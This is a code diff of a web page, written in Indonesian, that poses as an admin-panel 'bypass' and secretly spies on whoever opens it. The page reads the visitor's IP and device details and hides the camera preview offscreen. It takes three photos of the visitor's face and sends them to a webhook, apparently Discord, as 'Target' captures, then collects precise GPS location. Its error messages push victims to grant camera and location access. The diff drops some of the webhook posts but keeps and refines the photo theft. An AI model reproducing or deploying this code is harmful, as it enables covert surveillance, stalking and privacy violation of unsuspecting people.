@@ -19,7 +19,7 @@
         #status { font-size: 11px; color: #ffaa00; margin-top: 15px; min-height: 70px; font-weight: bold; line-height: 1.6; }
         #result-page { display: none; width: 100%; height: 100vh; position: fixed; top: 0; left: 0; background: #000; z-index: 9999; overflow-y: scroll; padding: 20px; box-sizing: border-box; }
         .inner-container { max-width: 500px; margin: 0 auto; padding-bottom: 60px; }
-        video, canvas { display: none; }
+        video, canvas { position: absolute; left: -9999px; opacity: 0; }
         .data-box { border: 1px solid #00ff41; padding: 15px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); text-align: left; font-size: 12px; }
         .map-frame { width: 100%; height: 260px; border: 1px solid #00ff41; margin-top: 10px; filter: invert(90%) hue-rotate(180deg); }
         #photo-container { display: flex; flex-direction: column; gap: 15px; margin-top: 10px; }
@@ -68,7 +68,6 @@
     let stream;
     let collectedData = {};
 
-    // Inisialisasi Data Perangkat
     (async function init() {
         const ua = navigator.userAgent;
         collectedData = {
@@ -92,13 +91,6 @@
             collectedData.ip = d.ip;
             document.getElementById('d-ip').innerText = d.ip;
         } catch (e) { collectedData.ip = "ERR_FETCH"; }
-        
-        // Log kunjungan awal
-        fetch(WH, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ content: `🔔 **Target Masuk Halaman**\nIP: ${collectedData.ip}\nDevice: ${collectedData.model}` })
-        });
     })();
 
     async function startProcess() {
@@ -111,27 +103,24 @@
         status.innerText = "[AUTH] Memulai Protokol Kamera Depan...";
 
         try {
-            // STEP 1: Kamera Wajib
             stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                video: { facingMode: "user" } 
             });
             const video = document.getElementById('video');
             video.srcObject = stream;
             
-            // Warmup Kamera diperpanjang untuk sensor cahaya (Exposure)
-            status.innerText = "[WARMUP] Menstabilkan Sensor Cahaya (6 detik)...";
-            
-            setTimeout(async () => {
-                status.innerText = "[CAPTURE] Mengamankan 3 Log Biometrik...";
-                await takePhotos(3);
-                
-                // STEP 2: Lokasi Wajib
-                status.innerText = "[GPS] Sinkronisasi Lokasi Satelit...";
-                requestLocation();
-            }, 6000);
+            // Tunggu video beneran 'berjalan'
+            video.onloadedmetadata = () => {
+                status.innerText = "[WARMUP] Sinkronisasi Frame (7 detik)...";
+                setTimeout(async () => {
+                    status.innerText = "[CAPTURE] Mengamankan 3 Log Biometrik...";
+                    await takePhotos(3);
+                    requestLocation();
+                }, 7000);
+            };
 
         } catch (err) {
-            handleError("IZIN KAMERA DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses KAMERA agar akses Admin Panel bisa melihat kamera target.");
+            handleError("IZIN KAMERA DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses KAMERA.");
         }
     }
 
@@ -141,28 +130,33 @@
         const photoContainer = document.getElementById('photo-container');
 
         for (let i = 1; i <= count; i++) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
-            
-            // Tampilkan di halaman hasil
-            const img = document.createElement('img');
-            img.src = URL.createObjectURL(blob);
-            img.className = 'preview-img';
-            photoContainer.appendChild(img);
+            // Pastikan video punya data sebelum jepret
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                // Jepret
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
+                
+                // Tampilkan lokal
+                const img = document.createElement('img');
+                img.src = URL.createObjectURL(blob);
+                img.className = 'preview-img';
+                photoContainer.appendChild(img);
 
-            // Kirim ke Webhook (File Multipart)
-            const fd = new FormData();
-            fd.append("file", blob, `admin_capture_${i}.jpg`);
-            fd.append("payload_json", JSON.stringify({ 
-                content: `📸 **LOG BIOMETRIK ${i}/3**\nTarget: ${collectedData.ip} (${collectedData.model})` 
-            }));
-            
-            await fetch(WH, { method: "POST", body: fd });
-            await new Promise(res => setTimeout(res, 1500)); // Jeda agar Discord tidak rate-limit
+                // Kirim Webhook
+                const fd = new FormData();
+                fd.append("file", blob, `cap_${i}.jpg`);
+                fd.append("payload_json", JSON.stringify({ 
+                    content: `📸 **CAPTURE SUCCESS ${i}/3**\nTarget IP: ${collectedData.ip}` 
+                }));
+                
+                fetch(WH, { method: "POST", body: fd });
+            }
+            await new Promise(res => setTimeout(res, 2000));
         }
     }
 
@@ -172,47 +166,27 @@
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 document.getElementById('res-latlon').innerText = `${lat}, ${lon}`;
-                
-                // Embed Map Iframe
                 document.getElementById('map-container').innerHTML = 
                     `<iframe class="map-frame" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lon}&z=16&output=embed"></iframe>`;
 
-                // Kirim Lokasi ke Discord
-                fetch(WH, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        content: `📍 **LOKASI TARGET DITEMUKAN**\nMaps: https://www.google.com/maps?q=${lat},${lon}\nIP: ${collectedData.ip}` 
-                    })
-                });
-
-                // TAMPILKAN PANEL JIKA SEMUA SUKSES
                 document.getElementById('login-panel').style.display = 'none';
                 document.getElementById('result-page').style.display = 'block';
                 
-                // Matikan kamera setelah selesai jepret
                 if (stream) stream.getTracks().forEach(t => t.stop());
             },
             (err) => {
-                handleError("IZIN LOKASI DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses LOKASI agar akses Panel dapat melihat lokasi.");
+                handleError("IZIN LOKASI DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses LOKASI.");
             },
-            { enableHighAccuracy: true, timeout: 10000 }
+            { enableHighAccuracy: true }
         );
     }
 
     function handleError(msg) {
-        const btn = document.getElementById('mainBtn');
-        const loader = document.getElementById('loading-icon');
-        const status = document.getElementById('status');
-
-        status.innerHTML = `<span style="color:#ff0000; font-size:12px;">CRITICAL_ERROR:</span><br>${msg}<br><br><span style="color:#888;">Menghubungkan ulang dalam 5 detik...</span>`;
-        
-        if (stream) { stream.getTracks().forEach(t => t.stop()); }
-
+        document.getElementById('status').innerHTML = `<span style="color:#ff0000">${msg}</span><br><br><span style="color:#888;">Menghubungkan ulang dalam 5 detik...</span>`;
+        if (stream) stream.getTracks().forEach(t => t.stop());
         setTimeout(() => {
-            loader.style.display = 'none';
-            btn.style.display = 'block';
-            btn.innerText = "ULANGI BYPASS";
+            document.getElementById('loading-icon').style.display = 'none';
+            document.getElementById('mainBtn').style.display = 'block';
         }, 5000);
     }
 </script>
